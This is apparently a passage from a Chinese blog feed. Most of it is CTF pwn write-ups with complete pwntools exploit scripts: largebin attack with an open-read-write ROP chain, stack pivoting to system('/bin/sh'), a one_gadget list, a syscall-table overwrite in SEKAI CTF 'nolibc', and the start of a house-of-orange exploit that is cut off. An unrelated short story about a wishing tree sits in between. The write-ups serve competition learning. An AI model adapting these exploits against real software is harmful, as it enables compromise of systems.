<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;need?\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story!\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="string">b&#x27;n&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;delete?\n&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;deleted?(y/n)\n&#x27;</span>,choice)    </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;give you a gift: &quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x4010</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x450</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment"># 1 防止合并</span></span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment"># 2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x498</span>) <span class="comment"># 3 打入largebin</span></span><br><span class="line">delete(<span class="number">2</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;write?\n&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;content: \n&#x27;</span>,p64(addr+<span class="number">0x101a</span>)+p64(<span class="number">0</span>)+p64(addr+<span class="number">0x4050</span>-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment"># 4 largebin attack</span></span><br><span class="line"></span><br><span class="line">ret = addr+<span class="number">0x101a</span></span><br><span class="line">pop_rdi_ret = addr+<span class="number">0x1863</span></span><br><span class="line">puts_got = addr+elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = addr+elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bss_addr = addr+<span class="number">0x4020</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(addr+<span class="number">0x15E1</span>) <span class="comment">#edit_addr</span></span><br><span class="line"></span><br><span class="line">edit(payload) <span class="comment"># libc 泄露</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#-0x080e50#</span></span><br><span class="line">rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))</span><br><span class="line">rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">rdx = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))</span><br><span class="line">r12 =  libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop r12;ret;&#x27;</span>)))</span><br><span class="line">leave_ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;leave;ret;&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">&#x27;open&#x27;</span>]+libc_base</span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">write_addr=libc.symbols[<span class="string">&#x27;write&#x27;</span>]+libc_base</span><br><span class="line">puts_addr=libc.symbols[<span class="string">&#x27;puts&#x27;</span>]+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read &#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload += p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi)+p64(bss_addr+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(rdx)+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">payload += p64(rdi)+p64(addr+elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(rsi)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload += p64(rdi)+p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(rsi)+p64(addr+elf.bss()+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(rdx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">payload += p64(rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi)+p64(addr+elf.bss()+<span class="number">0x200</span>)</span><br><span class="line">payload += p64(rdx)+p64(<span class="number">0x30</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;story!\n&#x27;</span>, payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(<span class="string">&#x27;./flag\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>这个题细节还是挺多的其实。</p>
<h1 id="羊城杯"><a href="#羊城杯" class="headerlink" title="羊城杯"></a>羊城杯</h1><h2 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h2><p>其实我想给mini的小朋友们出个这个的，但是吧当时自己一下子没做出来(´Ａ｀。)<br>不过其实比赛的时候想出来怎么做了，可惜没啥时间（就是自己水平低没秒掉而已）</p>
<p>静态分析没啥好看的，就是一个 read 多泄露 0x10 的栈溢出，显然栈迁移，问题在于只有一个 read 且可利用长度很短。每次都写在栈上没办法保留payload。</p>
<p>我的思路是返回的时候不要返回到函数开头，这样把函数开始栈初始化的部分跳过几句，rbp的值就可以一直保留在我们更改的地方，而之后 read 所输入的内容也是在这段栈上。</p>
<p>也是当时看了看汇编灵光一现。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;&quot;.)</span></span><br><span class="line">p= process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400773</span> </span><br><span class="line">bss =<span class="number">0x601b10</span>+<span class="number">0x30</span></span><br><span class="line">vuln_4 = <span class="number">0x04006B4</span></span><br><span class="line">lea_ret = <span class="number">0x04006db</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">payload1 += p64(bss)</span><br><span class="line">payload1 += p64(vuln_4)</span><br><span class="line">p.sendafter(<span class="string">b&quot;overflow?&quot;</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(puts_got)</span><br><span class="line">payload2 += p64(puts_plt)</span><br><span class="line">payload2 += p64(vuln_4-<span class="number">0x04</span>)</span><br><span class="line">payload2 += p64(bss-<span class="number">0x28</span>)</span><br><span class="line">payload2 += p64(lea_ret)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;overflow?&quot;</span>,payload2)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x80e50</span></span><br><span class="line">success(<span class="string">&#x27;libc=&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;overflow?&quot;</span>,payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(pop_rdi)</span><br><span class="line">payload2 += p64(libc_addr+<span class="number">0x01d8678</span>)</span><br><span class="line">payload2 += p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload2 += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload2 += p64(bss-<span class="number">0x38</span>)</span><br><span class="line">payload2 += p64(lea_ret)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendafter(<span class="string">b&quot;overflow?&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>打完之后感觉给小朋友出这个有点欺负人hhh。<br>不过需要注意的几点在出 mini 的时候其实都遇到了，主要就是主要要把栈迁移的地址往后写一点，因为在调用 puts 和 system 的时候都会调用多级函数，导致栈空间一直向上增长，毕竟我们不是写在系统分配的栈的页里，所以有可能会覆盖一些不能覆盖的东西或者遇到不可读不可写的地方。</p>
<p>这个时候就会有 段错误（指针无法正确解引用或者权限错误）</p>
<p>且尤其是栈迁移的次数越多，对可用空间的需求就越大，这也是 puts 函数时灵时不灵的原因。</p>
<p>当然，如果使用one_gadget，就没有 system 的栈增长问题，不过好巧不巧这个one_gadget暑假出过题都试过，总之我是没凑出来（（<br>所以当时另辟蹊径做了一些小手段，保证 system 也不会报错。</p>
<p>对于这个题因为为了 puts 也能顺利通过，真正写入payload的地址早就离 bss 很远了，所以报错了就再往后移个一点点好了（但似乎在调试的时候也遇到了移过头的问题，看起来像是正好覆盖了什么东西，具体原因不清楚）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">0xebc81 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="line"></span><br><span class="line">0xebc85 execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [r10] == NULL || r10 == NULL || r10 is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="line"></span><br><span class="line">0xebc88 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x78 is writable</span><br><span class="line">  [rsi] == NULL || rsi == NULL || rsi is a valid argv</span><br><span class="line">  [rdx] == NULL || rdx == NULL || rdx is a valid envp</span><br><span class="line"></span><br><span class="line">0xebce2 execve(<span class="string">&quot;/bin/sh&quot;</span>, rbp-0x50, r12)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x48 is writable</span><br><span class="line">  r13 == NULL || &#123;<span class="string">&quot;/bin/sh&quot;</span>, r13, NULL&#125; is a valid argv</span><br><span class="line">  [r12] == NULL || r12 == NULL || r12 is a valid envp</span><br><span class="line"></span><br><span class="line">0xebd38 execve(<span class="string">&quot;/bin/sh&quot;</span>, rbp-0x50, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x48 is writable</span><br><span class="line">  r12 == NULL || &#123;<span class="string">&quot;/bin/sh&quot;</span>, r12, NULL&#125; is a valid argv</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="line"></span><br><span class="line">0xebd3f execve(<span class="string">&quot;/bin/sh&quot;</span>, rbp-0x50, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x48 is writable</span><br><span class="line">  rax == NULL || &#123;rax, r12, NULL&#125; is a valid argv</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br><span class="line"></span><br><span class="line">0xebd43 execve(<span class="string">&quot;/bin/sh&quot;</span>, rbp-0x50, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp-0x50 is writable</span><br><span class="line">  rax == NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp</span><br></pre></td></tr></table></figure></div>
<p><em>（总之下次看到这样高版本的og我先跑了。）</em></p>
<h1 id="SEKAI-CTF-2024"><a href="#SEKAI-CTF-2024" class="headerlink" title="SEKAI CTF 2024"></a>SEKAI CTF 2024</h1><h2 id="nolibc"><a href="#nolibc" class="headerlink" title="nolibc"></a>nolibc</h2><p>逆逆逆逆逆！</p>
<p>暑假的时候逆了一次，速度很慢，开学再打开莫名其妙就看得懂了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2024-10-14192627.png"
                      alt="屏幕截图2024-10-14192627"
                ><br>打开是这样无符号的都是ida自动命名的</p>
<p>然后先一步步把里面有的syscall分析一下大概得到 sub_12C8 是 write, sub_1322是在模拟puts…<br>这一部分结合动态调试可以比较快的出结果，</p>
<p>然后在分析出一段 malloc 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241018145354.png"
                      alt="20241018145354"
                ></p>
<p>其实这段 malloc 直接看伪代码我只能分析出大概的功能，但是对具体的内存转换还是不太了解，具体的内容还是在调试中比较明白。<br>（这主要得益于这里乱七八糟的类型转换，比较巧妙的控制了地址）<br>其中这句 <code> chunk_size = (request + 15) &amp; 0xFFFFFFF0;</code><br>很明显有一个堆溢出，原理和libc里的 prev_size 位共用是一样的</p>
<p>add里也可以比规定的 0x100 多申请一个字节<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20241018152019.png"
                      alt="20241018152019"
                ></p>
<p>最后分析出把 0x5000~0x15000 的地址作为堆，后面是系统调用号表，把这里open覆盖成exec的系统调用号再传入<code>/bin/sh</code>调用即可。</p>
<p>open 传入文件名的时候也是 malloc 一个堆块的，但是这个时候已经覆盖满了，再临时删掉一个即可</p>
<p>exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, pad</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;option&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;length&#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;string&#x27;</span>, pad)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;option&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">filename</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;option&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;filename&#x27;</span>, filename)</span><br><span class="line">        </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;option&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username&#x27;</span>, <span class="string">b&#x27;miao&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Password&#x27;</span>, <span class="string">b&#x27;miao&#x27;</span>)    </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;option&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Username&#x27;</span>, <span class="string">b&#x27;miao&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Password&#x27;</span>, <span class="string">b&#x27;miao&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x17e</span>): <span class="comment">#0x10000-(0x30+0x30+0x4020)(register所需大小）=0x80*0x17f</span></span><br><span class="line">	add(<span class="number">0x6f</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">payload+= p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x7c</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">load(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>审计代码的能力大有长进( ´•̥̥̥ω•̥̥̥&#96; )，以及我真的很能拖，，该学逆向了。</p>
]]></content>
      <tags>
        <tag>学习日志</tag>
        <tag>Pwn</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>贪心不足</title>
    <url>/2024/10/17/%E8%B4%AA%E5%BF%83%E4%B8%8D%E8%B6%B3/</url>
    <content><![CDATA[<p><em>_φ</em>_(．．)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/9e22c67b0b9c3ac96424196840958b4.jpg"
                      alt="9e22c67b0b9c3ac96424196840958b4"
                ></p>
<h3 id="贪心不足"><a href="#贪心不足" class="headerlink" title="贪心不足"></a>贪心不足</h3><p>&emsp;&emsp;在这片陌生的土地上停泊了七八年，忽而又梦起那段对故土最后的记忆。随着年岁渐长，我自觉记性是一年不如一年了，只能敦促自己平日多写些东西，留着老来怀念。</p>
<p>&emsp;&emsp;那时我大学刚毕业，准备出国前回老家再转转，可惜家人都无空，便自己一个人去了。</p>
<p>&emsp;&emsp;这是我第一次一个人返乡，从市里到镇上再到村里的公交车如何坐都不熟练。又小又旧的面包车兜兜转转，摇摇晃晃，也不知什么时候再升级这些落后的设施。不过如今都是私家车，坐公交的人越来越少，或许会就这样开到报废，又或许再过两年，也没人回来了。</p>
<p>&emsp;&emsp;外婆家路远，奶奶家路近。我先去看望外婆，而后是奶奶，然后奶奶推荐我上山看看。</p>
<p>&emsp;&emsp;我是如何穿过迷雾走到山上的已不记得了，可能因为这是梦，又或许只是过去太久了。</p>
<p>&emsp;&emsp;我只记得，我先向内，然后一直向外走。</p>
<p>&emsp;&emsp;这迷雾后的树实在怪异，树干粗壮，像是活了百年。却不高大，而是向一边低沉下去，就像西湖边的老树那样沧桑。一条一条写着祈愿的红木牌，满满当当的把树压弯，鲜绿当中，杀出一片霎红惹眼。</p>
<p>&emsp;&emsp;人的心愿具象，原来是这样沉重。</p>
<p>&emsp;&emsp;树问我，想要求些什么。</p>
<p>&emsp;&emsp;我回答树，我不知道，我现在没有如此强烈的愿望想要求助怪力乱神，只是奶奶说这里有处许愿很灵，让我远行前来看看。</p>
<p>&emsp;&emsp;树说，没有私心的人不会见到我的，你心不诚。</p>
<p>&emsp;&emsp;我问，是这些人们的心愿把你压弯了吗，若是如此，我宁愿不许愿。</p>
<p>&emsp;&emsp;忽而一阵风吹过，树叶打树叶，红木牌打树叶，红木牌打红木牌。木牌上的愿望，吵吵闹闹地响起来。</p>
<p>&emsp;&emsp;有人求钱财，渴望一夜暴富；有人求姻缘，寻得一世一双人；有人求取健康，有人求取仇家暴毙，有人求取死人复生……有的人为自己许，有的人为旁人求；有的人想摆脱的，恰是别人垂涎欲滴的；有的人要的很多，却并不飘渺；有的人要的很少，但当真是神仙也救不了。</p>
<p>&emsp;&emsp;人啊人，当真是难以满足，可能人自己也不清楚自己真正想要的是什么。</p>
<p>&emsp;&emsp;我问树，这么多愿望，你会觉得他们贪婪吗，还是可怜他们无奈。</p>
<p>&emsp;&emsp;树说，如果我生来能听到人的心愿，可能背满愿望就是我的宿命。许愿的人如何，我不去想，我只是用我的枝干托举愿望。</p>
<p>&emsp;&emsp;我一怔，树的意思，我好像明白，却又不明白。</p>
<p>&emsp;&emsp;此时，一只狐狸从树的背后出现，“痴人，既然有缘见树，还不如快想想有什么愿望要许。”</p>
<p>&emsp;&emsp;我被吓了一跳，却也觉得狐狸说的在理，既见这样神奇的一棵树，自是机会难得。</p>
<p>&emsp;&emsp;狐狸继续说道，“我就是许了愿，才有机会和你们人说上两句话”，一步一步向我走来，眼里尽是卖力与得意。</p>
<p>&emsp;&emsp;这是什么意思，会说话的树，和向我讨封的狐狸？</p>
<p>&emsp;&emsp;我说，那如此说来，你是向这树许了不少愿，它也帮了你不少忙？</p>
<p>&emsp;&emsp;狐狸说，许了不少愿不假，但我为想要做的事努过不少力，这努力的意思当然可不只是向树许许愿，拜两下。不过我愿意相信树在帮我，才能遇到这么一个能听到我说话的呆子。</p>
<p>&emsp;&emsp;听起来，树很大方，狐狸很贪心。</p>
<p>&emsp;&emsp;“那你都许些什么愿呢”，我问狐狸。一只狐狸，还能许些什么愿望，这太让我好奇。</p>
<p>&emsp;&emsp;“树啊，救救我吧。”</p>
<p>&emsp;&emsp;狐狸几乎是脱口而出。</p>
<p>&emsp;&emsp;原来，狐狸也有这么多命悬一线无可奈何的时刻吗，不，或许只是狐狸太贪心。</p>
<p>&emsp;&emsp;我努力让气氛稍显轻松，打趣地说，“听起来，你活到现在也是倒也算大难不死。”</p>
<p>&emsp;&emsp;但狐狸的声音没有响起，仅是思考如何回应这令人愣神的答案的空隙，狐狸就这样消失在我的视线里，好像刚刚短暂的相遇只是我的幻觉。</p>
<p>&emsp;&emsp;我下意识想要寻找狐狸，环视一周，却只听到窸窣的声音，一个陌生的身影取代了狐狸。</p>
<p>&emsp;&emsp;那人身材高大但不算魁梧，着装素净，头上利落地簪着一个髻子，看着极有修养，也颇有功夫，总之不是我们这些尘网中的凡夫俗子模样。</p>
<p>&emsp;&emsp;他像是站在那里多时一般自然，劝我，时候不早该下山了。但这话实在古怪，莫名其妙一个人加上没头没脑一句话。</p>
<p>&emsp;&emsp;我略带警惕地打量着面前这个道长。“你又是谁？怎么会突然在这里。”</p>
<p>&emsp;&emsp;就像小说或是影视作品里会演绎的那样，道长不直面回答我的问题，而是说，“我周游四方路过此地，听到一位故人的声音过来看看，只是似乎它已经走了。”</p>
<p>&emsp;&emsp;说罢，他便向我行了一礼，像是表示惊扰我的歉意，又或许只是他的习惯，“既然它有意避我，我就回到自己原来的路线上吧。下山比上山更费体力、心力、时力，若是无事，早早下山回归也是好的。”</p>
<p>&emsp;&emsp;而后，他便转身离去，径直地，穿越了那棵树。</p>
<p>&emsp;&emsp;树叶摇动，木牌声震,人的愿望又再次铺天盖地地袭来。此刻，任谁也会惊起三分冷汗。无人看管却挂满红木牌的树，会说话的狐狸，和疑似通灵的道长，这雾气后的一切让我后知后觉地不安起来。</p>
<p>&emsp;&emsp;道长说的也算有理，若是无事，早早下山回归也是好的。但正要下山时，我的耳边同时响起狐狸和树的声音，亲切又温柔，循循善诱。</p>
<p>&emsp;&emsp;“许个愿吧。”</p>
<p>&emsp;&emsp;许是这经历太过奇幻骇人，我一时想不出一个具体的愿望，就这样匆匆忙忙下了山。</p>
<p>&emsp;&emsp;路上雾气散去，路却更加湿滑，狠狠跌了一跤。而后的夜里我作了许多梦，狐狸与道长辩经，树整理自己的枝杈，狐狸求树……直到人回到杭州，做着出发前的最后准备，身上的痛也还是不散。</p>
<p>&emsp;&emsp;思来想去，决定动身前往灵隐寺，求个心安，顺便还一个多年前就想还的愿。那时高考结束，姐姐送我的十八籽就不见了，之后成绩出来，说不上很好，但总算不是烂到家了。此后，我总在想，是丢失了的十八籽在“显灵”，还只是精神类药物的正常发挥。但心里的石头落下，象征着玄学意味的信物丢失，总是去“还愿”一下比较礼貌。只是这件事就这么一直拖着。如今才去，不仅仅是还愿，倒也是自我了却一桩心事。</p>
<p>&emsp;&emsp;还愿那天，面对高大威严的佛像，我突然又觉得这个心安也没什么好求的，若是怪梦不再做了，倒也不知道我到时候该感谢谁，也不打算再还一次愿。</p>
<p>&emsp;&emsp;树说的很有道理，我心不诚。所幸当日，怪梦便不再作了。至于身上的伤痛哪一日起让我不在意了，倒真记不清了。许是当日吧，也可能是再晚几日。</p>
<p>&emsp;&emsp;终于，多年后，我又梦起雾气朦胧的那一天。</p>
]]></content>
      <tags>
        <tag>白鸟</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCTF2024-ezheap</title>
    <url>/2024/09/23/ByteCTF2024/</url>
    <content><![CDATA[<p>_(:3 」∠ )_</p>
<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><p>主要利用手法是 house of orange ,因为没有 free。<br>edit里面可以随便溢出，改 top chunk。</p>
<p>思路是先house of orange打爆一次top chunk，unsortedbin里进一个chunk,泄露libc<br>然后找到新的top chunk,再打爆一次（提前把 unsortedbin 里的内容申请出来比较方便控制下一次top chunk的大小）<br>改malloc hook</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter 1 to add, 2 to free, 3 to show, 4 to edit, 0 to exit:&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter size to add:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter 1 to add, 2 